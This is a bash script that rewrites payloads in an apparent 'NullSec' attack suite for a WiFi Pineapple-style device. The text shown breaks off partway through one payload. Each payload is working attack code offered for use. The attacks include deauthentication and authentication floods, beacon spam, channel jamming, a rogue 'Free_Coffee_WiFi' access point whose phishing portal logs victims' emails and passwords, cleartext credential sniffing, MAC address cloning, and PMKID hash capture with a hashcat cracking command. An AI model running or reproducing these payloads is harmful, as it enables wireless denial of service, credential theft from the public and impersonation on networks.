#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Payload Fixer - Rewrites all broken payloads with proper Pager API
# Run this on your HOST machine (not on the Pineapple)
#═══════════════════════════════════════════════════════════════════════════════

SUITE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/nullsec-suite"
echo "[*] Fixing payloads in: $SUITE_DIR"
FIXED=0

# Helper: common Pager API header for all payloads
COMMON_HEADER='#!/bin/bash'

##############################################################################
# 1. AuthFlood - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/AuthFlood/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Auth Flood Attack
# Author: NullSec
# Description: Authentication flood using aireplay-ng
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/authflood"
mkdir -p "$LOOT_DIR"

PROMPT "AUTH FLOOD ATTACK

Floods target AP with fake
authentication requests.

Uses aireplay-ng fake auth
to cause denial of service.

Press OK to configure."

# Detect monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

SPINNER_START "Scanning for targets..."
rm -f /tmp/authflood*
timeout 12 airodump-ng "$MON_IF" -w /tmp/authflood --output-format csv 2>/dev/null &
sleep 12
killall airodump-ng 2>/dev/null
SPINNER_STOP

NET_COUNT=0
NETS=""
if [ -f /tmp/authflood-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"
        NET_COUNT=$((NET_COUNT + 1))
        NETS="${NETS}${NET_COUNT}. ${essid}\n"
        eval "BSSID_${NET_COUNT}=\"$bssid\""
        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
        [ $NET_COUNT -ge 10 ] && break
    done < /tmp/authflood-01.csv
fi

[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

PROMPT "TARGETS FOUND: $NET_COUNT

$(echo -e "$NETS")
Select target on next screen."

TARGET_NUM=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

eval "TARGET_BSSID=\"\$BSSID_${TARGET_NUM}\""
eval "TARGET_CH=\"\$CH_${TARGET_NUM}\""

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START AUTH FLOOD?

BSSID: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Auth flooding $TARGET_BSSID..."
LOG_FILE="$LOOT_DIR/flood_$(date +%Y%m%d_%H%M).log"

iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
MY_MAC=$(cat /sys/class/net/$MON_IF/address 2>/dev/null)

timeout "$DURATION" aireplay-ng -1 0 -a "$TARGET_BSSID" -h "$MY_MAC" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
wait $!

rm -f /tmp/authflood* 2>/dev/null

PROMPT "AUTH FLOOD COMPLETE

BSSID: $TARGET_BSSID
Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 2. Banshee - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/Banshee/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Banshee - Deauth Screamer
# Author: NullSec
# Description: Aggressive deauthentication attack
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "BANSHEE - DEAUTH SCREAMER

Aggressive deauthentication
attack on target networks.

Disconnects all clients
from selected AP.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

SPINNER_START "Scanning for targets..."
rm -f /tmp/banshee*
timeout 15 airodump-ng "$MON_IF" -w /tmp/banshee --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

NET_COUNT=0
NETS=""
if [ -f /tmp/banshee-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"
        NET_COUNT=$((NET_COUNT + 1))
        NETS="${NETS}${NET_COUNT}. ${essid}\n"
        eval "BSSID_${NET_COUNT}=\"$bssid\""
        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
        eval "ESSID_${NET_COUNT}=\"$essid\""
        [ $NET_COUNT -ge 10 ] && break
    done < /tmp/banshee-01.csv
fi

[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

PROMPT "TARGETS: $NET_COUNT

$(echo -e "$NETS")
Select target next."

TARGET_NUM=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

eval "TARGET_BSSID=\"\$BSSID_${TARGET_NUM}\""
eval "TARGET_CH=\"\$CH_${TARGET_NUM}\""
eval "TARGET_ESSID=\"\$ESSID_${TARGET_NUM}\""

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "UNLEASH BANSHEE?

Target: $TARGET_ESSID
BSSID: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Banshee attacking $TARGET_ESSID..."
LOG_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M).log"

iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
wait $!
killall aireplay-ng 2>/dev/null

rm -f /tmp/banshee* 2>/dev/null

DEAUTH_COUNT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null || echo "N/A")

PROMPT "BANSHEE COMPLETE

Target: $TARGET_ESSID
Deauths sent: ~$DEAUTH_COUNT
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 3. BeaconSpam - Fixed: actually inject beacons using mdk3/mdk4
##############################################################################
cat > "$SUITE_DIR/BeaconSpam/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Beacon Spam
# Author: NullSec
# Description: Flood area with fake WiFi networks
# Category: nullsec/chaos

LOOT_DIR="/mmc/nullsec/beaconspam"
mkdir -p "$LOOT_DIR"

PROMPT "BEACON SPAM

Flood the area with fake
WiFi network names.

Choose from themed lists
or enter custom SSIDs.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

PROMPT "SELECT SSID THEME:

1. Funny Names
2. Scary/Warning
3. Tech Humor
4. Custom SSID List

Select on next screen."

THEME=$(NUMBER_PICKER "Theme (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) THEME=1 ;; esac

SSID_FILE="/tmp/beacon_ssids.txt"
rm -f "$SSID_FILE"

case $THEME in
    1)
        cat > "$SSID_FILE" << 'SSIDLIST'
FBI_Surveillance_Van
NSA_Mobile_Unit
Pretty_Fly_for_a_WiFi
Wu-Tang_LAN
Bill_Wi_the_Science_Fi
Drop_It_Like_Its_Hotspot
LAN_Solo
The_Promised_LAN
Loading...
Error_404_WiFi_Not_Found
Virus_Distribution_Center
Free_Virus_Download
DefinitelyNotAHacker
GetOffMyLAN
It_Hurts_When_IP
SSIDLIST
        ;;
    2)
        cat > "$SSID_FILE" << 'SSIDLIST'
POLICE_SURVEILLANCE
FBI_VAN_4827
DEA_MONITORING
IRS_AUDIT_UNIT
YOUR_FILES_ENCRYPTED
SYSTEM_COMPROMISED
MALWARE_DETECTED
SECURITY_BREACH
VIRUS_ALERT
DO_NOT_CONNECT
QUARANTINE_ZONE
SSIDLIST
        ;;
    3)
        cat > "$SSID_FILE" << 'SSIDLIST'
127.0.0.1
localhost
/dev/null
rm_-rf_slash
sudo_make_sandwich
DROP_TABLE_wifi
SELECT_*_FROM_users
Buffer_Overflow
Kernel_Panic
SEGFAULT
SSIDLIST
        ;;
    4)
        CUSTOM=$(TEXT_PICKER "Enter SSID name:" "NullSec_WiFi")
        echo "$CUSTOM" > "$SSID_FILE"
        ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START BEACON SPAM?

Theme: $THEME
Duration: ${DURATION}s
Interface: $MON_IF

Area will be flooded
with fake networks.

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting beacon spam..."
LOG_FILE="$LOOT_DIR/spam_$(date +%Y%m%d_%H%M).log"

# Use mdk4 if available (proper beacon injection), otherwise mdk3
if command -v mdk4 >/dev/null 2>&1; then
    timeout "$DURATION" mdk4 "$MON_IF" b -f "$SSID_FILE" -s 100 2>&1 | tee "$LOG_FILE" &
elif command -v mdk3 >/dev/null 2>&1; then
    timeout "$DURATION" mdk3 "$MON_IF" b -f "$SSID_FILE" -s 100 2>&1 | tee "$LOG_FILE" &
else
    # Fallback: use aireplay-ng beacon frames per SSID
    END_TIME=$(($(date +%s) + DURATION))
    COUNT=0
    while [ $(date +%s) -lt $END_TIME ]; do
        while read SSID; do
            [ -z "$SSID" ] && continue
            [ $(date +%s) -ge $END_TIME ] && break
            CH=$(( (RANDOM % 11) + 1 ))
            iwconfig "$MON_IF" channel $CH 2>/dev/null
            # Send probe response which acts as beacon
            aireplay-ng -9 -e "$SSID" "$MON_IF" 2>/dev/null &
            sleep 0.3
            killall aireplay-ng 2>/dev/null
            COUNT=$((COUNT + 1))
            echo "$(date +%H:%M:%S) $SSID CH:$CH" >> "$LOG_FILE"
        done < "$SSID_FILE"
    done &
fi

BEACON_PID=$!
sleep "$DURATION"
kill $BEACON_PID 2>/dev/null
killall mdk4 mdk3 aireplay-ng 2>/dev/null

rm -f "$SSID_FILE"

PROMPT "BEACON SPAM COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 4. ChannelJammer - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/ChannelJammer/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Channel Jammer
# Author: NullSec
# Description: Disrupt WiFi across channels using deauth
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

PROMPT "CHANNEL JAMMER

Disrupt WiFi on selected
channels using deauth.

Modes:
1. Single channel
2. Channel range
3. All 2.4GHz
4. All 5GHz

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "JAMMING MODE:

1. All 2.4GHz (1-11)
2. Low channels (1-6)
3. High channels (6-11)
4. Single channel

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

case $MODE in
    1) CHANNELS="1 2 3 4 5 6 7 8 9 10 11" ;;
    2) CHANNELS="1 2 3 4 5 6" ;;
    3) CHANNELS="6 7 8 9 10 11" ;;
    4)
        SINGLE_CH=$(NUMBER_PICKER "Channel (1-11):" 6)
        CHANNELS="$SINGLE_CH"
        ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Channels: $CHANNELS
Duration: ${DURATION}s

All networks on these
channels will be disrupted.

Press OK to jam.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Jamming channels: $CHANNELS"
LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"

END_TIME=$(($(date +%s) + DURATION))
CYCLES=0

while [ $(date +%s) -lt $END_TIME ]; do
    for CH in $CHANNELS; do
        [ $(date +%s) -ge $END_TIME ] && break
        iwconfig "$MON_IF" channel $CH 2>/dev/null
        aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
        echo "$(date +%H:%M:%S) JAM CH:$CH" >> "$LOG_FILE"
        sleep 2
        killall aireplay-ng 2>/dev/null
    done
    CYCLES=$((CYCLES + 1))
done

killall aireplay-ng 2>/dev/null

PROMPT "JAMMING COMPLETE

Channels: $CHANNELS
Cycles: $CYCLES
Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 5. CoffeeShopAttack - Was CLI, now Pager API + fix CGI
##############################################################################
cat > "$SUITE_DIR/CoffeeShopAttack/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Coffee Shop Attack
# Author: bad-antics
# Description: Rogue AP for public WiFi credential capture
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/coffeeshop"
mkdir -p "$LOOT_DIR"
PORTAL_DIR="/tmp/cafe_portal"

PROMPT "COFFEE SHOP ATTACK

Creates a convincing open
WiFi network that captures
credentials via portal.

No aircrack needed - uses
hostapd and dnsmasq.

Press OK to configure."

# Need a non-monitor interface for AP mode
AP_IF="wlan1"
[ ! -d "/sys/class/net/$AP_IF" ] && AP_IF="wlan0"
[ ! -d "/sys/class/net/$AP_IF" ] && { ERROR_DIALOG "No WiFi interface found!"; exit 1; }

SSID=$(TEXT_PICKER "AP Name:" "Free_Coffee_WiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="Free_Coffee_WiFi" ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?

SSID: $SSID
Duration: ${DURATION} minutes
Interface: $AP_IF

Victims connecting will see
a credential capture portal.

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

CRED_LOG="$LOOT_DIR/cafe_$(date +%Y%m%d_%H%M).txt"
echo "Coffee Shop Credentials - $(date)" > "$CRED_LOG"

killall hostapd dnsmasq 2>/dev/null
sleep 1

# Create portal
mkdir -p "$PORTAL_DIR/cgi-bin"

cat > "$PORTAL_DIR/cgi-bin/capture" << CAPEOF
#!/bin/sh
echo "Content-type: text/html"
echo ""
if [ "\$REQUEST_METHOD" = "POST" ]; then
    read POST_DATA
else
    POST_DATA="\$QUERY_STRING"
fi
TS=\$(date "+%Y-%m-%d %H:%M:%S")
IP=\$REMOTE_ADDR
echo "[\$TS] IP:\$IP DATA:\$POST_DATA" >> $CRED_LOG
cat << HTML
<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="2;url=/success.html"></head>
<body style="font-family:Arial;text-align:center;padding:50px">
<h1 style="color:#4caf50">Connecting...</h1></body></html>
HTML
CAPEOF
chmod +x "$PORTAL_DIR/cgi-bin/capture"

cat > "$PORTAL_DIR/index.html" << PORTALEOF
<!DOCTYPE html>
<html><head><title>$SSID - Free WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#f9f9f9;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,.1)}.l{text-align:center;font-size:40px;margin-bottom:20px}h1{text-align:center;color:#333;font-size:22px}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px}button{width:100%;padding:14px;background:#4caf50;color:#fff;border:none;border-radius:8px;font-size:16px}</style>
</head><body><div class="c"><div class="l">☕</div><h1>$SSID</h1>
<p style="text-align:center;color:#666">Sign in for free WiFi</p>
<form method="POST" action="/cgi-bin/capture">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password">
<button type="submit">Connect</button></form></div></body></html>
PORTALEOF

cat > "$PORTAL_DIR/success.html" << 'SEOF'
<!DOCTYPE html><html><head><title>Connected!</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f9f9f9}h1{color:#4caf50}</style>
</head><body><h1>✓ Connected!</h1><p>Enjoy free WiFi</p></body></html>
SEOF

LOG "Starting Coffee Shop AP..."

# Disable monitor mode on this interface if active
airmon-ng stop "${AP_IF}mon" 2>/dev/null

cat > /tmp/cafe_hostapd.conf << HEOF
interface=$AP_IF
ssid=$SSID
channel=6
hw_mode=g
auth_algs=1
wpa=0
HEOF

hostapd /tmp/cafe_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/cafe_dns.conf << DEOF
interface=$AP_IF
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.200,12h
address=/#/10.0.0.1
DEOF
dnsmasq -C /tmp/cafe_dns.conf 2>/dev/null

uhttpd -p 10.0.0.1:80 -h "$PORTAL_DIR" -c /cgi-bin -x /cgi-bin 2>/dev/null &

LOG "Coffee Shop active: $SSID"

sleep "$DURATION_SEC"

killall hostapd dnsmasq uhttpd 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/cafe_*.conf

CRED_COUNT=$(grep -c "DATA:" "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "COFFEE SHOP COMPLETE

SSID: $SSID
Duration: ${DURATION} min
Captured: $CRED_COUNT creds
Log: $CRED_LOG

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 6. CredSniffer - Was CLI, now Pager API
##############################################################################
cat > "$SUITE_DIR/CredSniffer/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Credential Sniffer
# Author: NullSec
# Description: Passive credential sniffing with tcpdump
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

PROMPT "CREDENTIAL SNIFFER

Passive sniffing for
cleartext credentials.

Modes:
- HTTP forms/basic auth
- FTP credentials
- All cleartext
- Full packet capture

Press OK to configure."

# Find best interface
IFACE=""
for i in br-lan eth0 wlan1mon wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

PROMPT "SNIFFING MODE:

1. HTTP credentials
2. FTP credentials
3. All cleartext passwords
4. Full packet capture

Interface: $IFACE
Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

resp=$(CONFIRMATION_DIALOG "START SNIFFING?

Interface: $IFACE
Mode: $MODE
Duration: ${DURATION}s

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
LOG_FILE="$LOOT_DIR/sniff_$TIMESTAMP.log"
PCAP_FILE="$LOOT_DIR/capture_$TIMESTAMP.pcap"

LOG "Sniffing on $IFACE..."

case $MODE in
    1) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 80' 2>/dev/null | grep -iE 'user|pass|login|email|auth' > "$LOG_FILE" & ;;
    2) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 21' 2>/dev/null | grep -iE '^USER|^PASS' > "$LOG_FILE" & ;;
    3) timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 21 or tcp port 23 or tcp port 80 or tcp port 110 or tcp port 143' 2>/dev/null | grep -iE 'user|pass|login|auth|credential' > "$LOG_FILE" & ;;
    4) timeout $DURATION tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 2>/dev/null & ;;
esac

wait $!

CRED_COUNT=0
[ -f "$LOG_FILE" ] && CRED_COUNT=$(wc -l < "$LOG_FILE" | tr -d ' ')

PROMPT "SNIFFING COMPLETE

Duration: ${DURATION}s
Lines captured: $CRED_COUNT
Log: $LOG_FILE
$([ -f "$PCAP_FILE" ] && echo "PCAP: $PCAP_FILE")

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 7. Mimic - Was CLI args, now Pager API with scan+select
##############################################################################
cat > "$SUITE_DIR/Mimic/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Mimic - MAC Cloner
# Author: NullSec
# Description: Clone any device MAC address
# Category: nullsec/stealth

LOOT_DIR="/mmc/nullsec/mimic"
mkdir -p "$LOOT_DIR"

PROMPT "MIMIC - MAC CLONER

Clone another device's MAC
address to impersonate it
on the network.

1. Scan for clients
2. Select target MAC
3. Apply to interface

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done

PROMPT "INPUT METHOD:

1. Scan for target MACs
2. Enter MAC manually

Select on next screen."

METHOD=$(NUMBER_PICKER "Method (1-2):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=1 ;; esac

if [ "$METHOD" -eq 1 ] && [ -n "$MON_IF" ]; then
    SPINNER_START "Scanning for devices..."
    rm -f /tmp/mimic_scan*
    timeout 15 airodump-ng "$MON_IF" -w /tmp/mimic_scan --output-format csv 2>/dev/null &
    sleep 15
    killall airodump-ng 2>/dev/null
    SPINNER_STOP

    # Parse client MACs
    MAC_COUNT=0
    MACS=""
    if [ -f /tmp/mimic_scan-01.csv ]; then
        IN_CLIENTS=0
        while IFS=',' read -r mac rest; do
            mac=$(echo "$mac" | tr -d ' ')
            [[ "$mac" == *"Station"* ]] && IN_CLIENTS=1 && continue
            [ $IN_CLIENTS -eq 0 ] && continue
            [[ ! "$mac" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            MAC_COUNT=$((MAC_COUNT + 1))
            MACS="${MACS}${MAC_COUNT}. ${mac}\n"
            eval "MAC_${MAC_COUNT}=\"$mac\""
            [ $MAC_COUNT -ge 10 ] && break
        done < /tmp/mimic_scan-01.csv
    fi

    if [ $MAC_COUNT -gt 0 ]; then
        PROMPT "FOUND $MAC_COUNT CLIENTS:

$(echo -e "$MACS")
Select target next."
        SEL=$(NUMBER_PICKER "Client (1-$MAC_COUNT):" 1)
        eval "TARGET_MAC=\"\$MAC_${SEL}\""
    else
        TARGET_MAC=$(MAC_PICKER "Target MAC:")
    fi
else
    TARGET_MAC=$(MAC_PICKER "Target MAC:")
fi

[ -z "$TARGET_MAC" ] && { ERROR_DIALOG "No MAC specified!"; exit 1; }

PROMPT "CLONE INTERFACE:

1. wlan1 (attack radio)
2. eth0 (wired)

Select on next screen."

IF_CHOICE=$(NUMBER_PICKER "Interface (1-2):" 1)
case $IF_CHOICE in
    1) CLONE_IF="wlan1" ;;
    2) CLONE_IF="eth0" ;;
    *) CLONE_IF="wlan1" ;;
esac

ORIGINAL_MAC=$(cat /sys/class/net/$CLONE_IF/address 2>/dev/null)

resp=$(CONFIRMATION_DIALOG "CLONE MAC?

Target: $TARGET_MAC
Interface: $CLONE_IF
Original: $ORIGINAL_MAC

Interface will go down
briefly during change.

Press OK to clone.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Cloning MAC..."

# Stop monitor mode if active on this interface
airmon-ng stop "${CLONE_IF}mon" 2>/dev/null

ip link set "$CLONE_IF" down 2>/dev/null
ip link set "$CLONE_IF" address "$TARGET_MAC" 2>/dev/null
ip link set "$CLONE_IF" up 2>/dev/null

NEW_MAC=$(cat /sys/class/net/$CLONE_IF/address 2>/dev/null)
echo "$(date) Cloned $TARGET_MAC on $CLONE_IF (was $ORIGINAL_MAC)" >> "$LOOT_DIR/clone_log.txt"

# Restart monitor if needed
airmon-ng start "$CLONE_IF" 2>/dev/null

if [ "$NEW_MAC" = "$TARGET_MAC" ]; then
    PROMPT "MAC CLONED!

Interface: $CLONE_IF
Old MAC: $ORIGINAL_MAC
New MAC: $NEW_MAC

Press OK to exit."
else
    PROMPT "MAC CHANGE RESULT

Interface: $CLONE_IF
Requested: $TARGET_MAC
Current: $NEW_MAC

(May differ on some HW)
Press OK to exit."
fi

rm -f /tmp/mimic_scan* 2>/dev/null
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 8. PMKIDCapture - Was CLI echo/read, now Pager API
##############################################################################
cat > "$SUITE_DIR/PMKIDCapture/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: PMKID Capture
# Author: NullSec
# Description: Capture PMKID hashes for offline cracking
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/pmkid"
mkdir -p "$LOOT_DIR"

PROMPT "PMKID CAPTURE

Capture PMKID hashes using
hcxdumptool. Works WITHOUT
any clients connected!

Captured hashes can be
cracked with hashcat -m 22000

Press OK to configure."

# Check for hcxdumptool
if ! command -v hcxdumptool >/dev/null 2>&1; then
    ERROR_DIALOG "hcxdumptool not found!

Install from packages:
opkg install hcxdumptool"
    exit 1
fi

# Need raw wifi interface (not monitor)
CAPTURE_IF="wlan1"
[ ! -d "/sys/class/net/$CAPTURE_IF" ] && CAPTURE_IF="wlan0"

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START PMKID CAPTURE?

Interface: $CAPTURE_IF
Duration: ${DURATION}s

Attacks WPA2/WPA3 networks
without needing clients.

Press OK to capture.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
PCAPNG_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.pcapng"
HASH_FILE="$LOOT_DIR/pmkid_$TIMESTAMP.22000"

LOG "Starting PMKID capture..."

# Stop monitor mode if active
airmon-ng stop "${CAPTURE_IF}mon" 2>/dev/null

timeout "$DURATION" hcxdumptool -i "$CAPTURE_IF" -o "$PCAPNG_FILE" --active_beacon --enable_status=15 2>&1 &
wait $!

# Re-enable monitor
airmon-ng start "$CAPTURE_IF" 2>/dev/null

HASH_COUNT=0
if [ -f "$PCAPNG_FILE" ] && [ -s "$PCAPNG_FILE" ]; then
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "$HASH_FILE" "$PCAPNG_FILE" 2>/dev/null
        [ -f "$HASH_FILE" ] && HASH_COUNT=$(wc -l < "$HASH_FILE" | tr -d ' ')
    fi
fi

PROMPT "PMKID CAPTURE COMPLETE

Hashes captured: $HASH_COUNT
PCAPNG: $PCAPNG_FILE
$([ -f "$HASH_FILE" ] && echo "Hashes: $HASH_FILE")

Crack with:
hashcat -m 22000 hashes.22000 wordlist.txt

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 9. Poltergeist - Fixed $RANDOM, now Pager API
##############################################################################
cat > "$SUITE_DIR/Poltergeist/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: Poltergeist - Random WiFi Chaos
# Author: NullSec
# Description: Unpredictable WiFi disruption attacks
# Category: nullsec/chaos

LOOT_DIR="/mmc/nullsec/poltergeist"
mkdir -p "$LOOT_DIR"

PROMPT "POLTERGEIST - RANDOM CHAOS

Randomly disrupt WiFi with
unpredictable attack patterns.

- Random deauth bursts
- Random fake auth
- Channel hopping attacks
- Random timing

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Chaos duration (sec):" 120)
